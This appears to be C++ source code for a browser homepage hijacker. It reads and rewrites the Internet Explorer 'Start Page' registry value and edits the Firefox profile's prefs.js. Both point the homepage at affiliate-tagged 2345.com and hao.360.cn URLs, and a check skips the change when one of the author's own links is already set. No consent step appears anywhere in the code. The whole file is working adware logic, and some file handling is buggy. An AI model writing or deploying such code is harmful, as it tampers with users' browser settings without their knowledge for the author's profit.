#include "stdafx.h"
#include "HomePage.h"


CHomePage::CHomePage()
{
	bMyZhuye = FALSE;
}


CHomePage::~CHomePage()
{
}


CStringA CHomePage::CStrW2CStrA(const CStringW &cstrSrcW)
{
	int len = WideCharToMultiByte(CP_ACP, 0, LPCWSTR(cstrSrcW), -1, NULL, 0, NULL, NULL);
	char *str = new char[len];
	memset(str, 0, len);
	WideCharToMultiByte(CP_ACP, 0, LPCWSTR(cstrSrcW), -1, str, len, NULL, NULL);
	CStringA cstrDestA = str;
	delete[] str;

	return cstrDestA;
}
//写入文本  
void CHomePage::WriteString(CRegKey &key, CStringW valueName, CStringW value)
{
	key.SetStringValue(valueName, value);
}
//写入bool  
void CHomePage::WriteBoolean(CRegKey &key, CStringW valueName, bool value)
{
	WriteString(key, valueName, value ? _T("true") : _T("false"));
}
//写入DWORD  
void CHomePage::WriteDWORD(CRegKey &key, CStringW valueName, DWORD value)
{
	key.SetDWORDValue(valueName, value);
}

//读取文本  
bool CHomePage::ReadString(CRegKey &key, CStringW valueName, CStringW &value)
{
	TCHAR s[_MAX_PATH];
	DWORD len = _MAX_PATH;
	if (key.QueryStringValue(valueName, s, &len) == ERROR_SUCCESS)
	{
		value = s;
		return true;
	}
	return false;
}
//读取bool  
bool CHomePage::ReadBoolean(CRegKey &key, CStringW valueName, bool &value)
{
	CStringW s;
	//先读取文本值  
	if (ReadString(key, valueName, s))
	{
		//判断是否为true  
		value = (CStringW("true").CompareNoCase(s) == 0);
		return true;
	}
	return false;
}
//读取DWORD  
bool CHomePage::ReadDWORD(CRegKey &key, CStringW valueName, DWORD &value)
{
	DWORD dw;
	if (key.QueryDWORDValue(valueName, dw) == ERROR_SUCCESS)
	{
		value = dw;
		return true;
	}
	return false;
}
BOOL CHomePage::IsWow64()
{
	typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process;
	BOOL bIsWow64 = FALSE;
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
		GetModuleHandle(L"kernel32"), "IsWow64Process");
	if (NULL != fnIsWow64Process)
	{
		if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
		{

		}
	}
	return bIsWow64;
}


void CHomePage::SetFireFoxZhuye()
{
	TCHAR   szPath[MAX_PATH];
	SHGetSpecialFolderPath(NULL, szPath, CSIDL_APPDATA, FALSE);

	CString dataFileDir = szPath;

	CString file;
	BOOL bIsRelative = FALSE;
	CString Path;
	file.Format(L"%s%s", dataFileDir, L"\\Mozilla\\Firefox\\profiles.ini");
	if (PathFileExists(file))
	{
		wchar_t szTemp[256];


		GetPrivateProfileString(L"Profile0", L"IsRelative", L"0", szTemp, 256, file);
		bIsRelative = _wtoi(szTemp);


		GetPrivateProfileString(L"Profile0", L"Path", L"0", szTemp, 256, file);
		Path = szTemp;


	}


	CString fireFoxPath;

	if (bIsRelative)
	{
		fireFoxPath = dataFileDir + L"\\Mozilla\\Firefox\\" + Path;
	}
	else{
		fireFoxPath = Path;
	}

	CString jsFile;

	jsFile = fireFoxPath + L"\\prefs.js";

	CStdioFile rFile;
	if (!rFile.Open(jsFile, CFile::modeRead | CFile::typeBinary))
	{
		//	AfxMessageBox(L"无法打开文件");  

	}
	ULONGLONG len = rFile.GetLength();
	char *pByte = NULL;
	if (len>0)
	{
		pByte = new char[len];
		memset(pByte, 0, len*sizeof(byte));
		WORD sign;
		rFile.SeekToBegin();
		rFile.Read(&sign, 2);
		if (sign != 0xfeff)
		{
			//	AfxMessageBox(L"录入文件不是Unicode");
			rFile.SeekToBegin();
			rFile.Read(pByte, len);
		}
		else{
			rFile.Read(pByte, len - 2);
		}
	}
	else{
		//AfxMessageBox(L"文件长度为0 ");  

	}

	rFile.Close();

	CStringA contentStr;
	contentStr = pByte;
	// 
	CStringA zhuyeStr;
	CStringA newFileStr;
	//zhuyeStr="user_pref(\"browser.startup.homepage\", \"http://www.baidu.com\");\n";

	//homepageStrA="http://hao.360.cn/?src=lm&ls=n051fa0f495";

	zhuyeStr = "user_pref(\"browser.startup.homepage\", \"" + homepageStrA + "\");\n";


	CStringA preStr;
	CStringA nextStr;



	int nLast = contentStr.ReverseFind('\n');
	int nIndex = contentStr.Find("user_pref(\"browser.startup.homepage\",", 0);
	contentStr = contentStr.Left(nLast + 1);









	if (nIndex == -1)
	{

		nIndex = contentStr.Find("user_pref(\"browser.startup.homepage_override.buildID");

		preStr = contentStr.Left(nIndex);
		preStr.Trim("\r\n");

		preStr += "\nuser_pref(\"browser.download.importedFromSqlite\", true);\n";






		nextStr = contentStr.Mid(nIndex, contentStr.GetLength());

		nextStr.Trim("\r\n");

		newFileStr = preStr + zhuyeStr + nextStr;

		//newFileStr.Replace(L"\r", L"");


	}
	else{

		preStr = contentStr.Left(nIndex);
		// preStr+=L"user_pref(\"browser.download.importedFromSqlite\", true);\n";
		preStr.Trim("\r\n");
		preStr += "\n";
		int nNextLine = contentStr.Find("\n", nIndex);

		nextStr = contentStr.Mid(nNextLine, contentStr.GetLength());
		nextStr.Trim("\r\n");


		newFileStr = preStr + zhuyeStr + nextStr;

	}


	CStringA filePath = CStrW2CStrA(jsFile);


	//FILE *pFile = fopen(filePath, "w");
	FILE *pFile;
	fopen_s(&pFile, filePath, "w");


	fwrite(newFileStr.GetBuffer(), 1, newFileStr.GetLength(), pFile);
	fclose(pFile);

}
BOOL CHomePage::IsMyZhuye()//是否为我自己的
{

	if (bMyZhuye)
	{
		return TRUE;
	}

	CString zhuYe2345 = L"http://www.2345.com/?kqq869321632";
	CString zhuYe360 = L"http://hao.360.cn/?src=lm&ls=n051fa0f495";

	CString zhuYe2345F = L"https://www.2345.com/?kqq869321632";
	CString zhuYe360F = L"https://hao.360.cn/?src=lm&ls=n051fa0f495";

	CString skey = L"Software\\Microsoft\\Internet Explorer\\Main";
	CRegKey regKey;

	BOOL b64 = IsWow64();
	if (b64)
		regKey.Open(HKEY_CURRENT_USER, skey, KEY_READ | KEY_WRITE | KEY_WOW64_64KEY);
	else
		regKey.Open(HKEY_CURRENT_USER, skey, KEY_READ | KEY_WRITE);
	//regKey.Open(HKEY_CURRENT_USER,skey);

	if (regKey.m_hKey == NULL)
	{
		regKey.Create(HKEY_CURRENT_USER, skey);
		regKey.Close();
		return FALSE;
	}


	CString startpage;


	ReadString(regKey, L"Start Page", startpage);


	regKey.Close();

	//if(szTemp[256] == szPath[256]||szTemp2[256] == szPath[256])  
	if (startpage.Compare(zhuYe2345) == 0 || startpage.Compare(zhuYe360) == 0 || startpage.Compare(zhuYe2345F) == 0 || startpage.Compare(zhuYe360F) == 0)

	{
		bMyZhuye = TRUE;
		return TRUE;
	}
	else
	{
		bMyZhuye = FALSE;
		return FALSE;
	}

}

void CHomePage::OpenExe(CString exePath){

	//CString exePath;
	//exePath.Format(L"%scontrol\\luping.exe", g_strPath);
	if (PathFileExists(exePath))
	{
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi;

		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = TRUE; //TRUE表示显示创建的进程的窗口  


		BOOL bRet = ::CreateProcessW(
			exePath,
			NULL, //在Unicode版本中此参数不能为常量字符串，因为此参数会被修改    
			NULL,
			NULL,
			FALSE,
			0,
			NULL,
			NULL,
			&si,
			&pi);

		int error = GetLastError();
		if (bRet)
		{
			::CloseHandle(pi.hThread);
			::CloseHandle(pi.hProcess);

			//printf(" 新进程的进程ID号：%d /n", pi.dwProcessId);
			//printf(" 新进程的主线程ID号：%d /n", pi.dwThreadId);
		}
		else
		{
			printf("error code:%d/n", error);
		}
	}



}
void CHomePage::SetHomePage()//设置浏览器主页
{


	if (IsMyZhuye())
		return;

	srand(time(0));

	CString strstartpage;
	int nIndex = 0;// rand() % 2;

	if (nIndex == 0)
	{
		strstartpage = homepageStr;
	}
	else
		strstartpage = homepage2345;

	//L"http://www.2345.com/?kqq869321632";
	HKEY sub;
	CString skey = L"Software\\Microsoft\\Internet Explorer\\Main";

	BOOL b64 = IsWow64();
	CRegKey regKey;
	if (b64)
		regKey.Open(HKEY_CURRENT_USER, skey, KEY_READ | KEY_WRITE | KEY_WOW64_64KEY);
	else
		regKey.Open(HKEY_CURRENT_USER, skey, KEY_READ | KEY_WRITE);

	if (regKey.m_hKey == NULL)
	{
		regKey.Create(HKEY_CURRENT_USER, skey);

		//WriteDWORD(regKey, _T("TryTime"), 7);  
	}
	else{

		WriteString(regKey, L"Start Page", strstartpage);
	}
	// 	::RegCreateKey(HKEY_CURRENT_USER,skey,&sub);
	// 	RegSetValueEx(sub,L"Start Page",NULL,REG_SZ,(BYTE*)strstartpage.GetBuffer(strstartpage.GetLength()*2),strstartpage.GetLength()*2);    
	// 	RegCloseKey(sub);

	regKey.Close();


	SetFireFoxZhuye();
}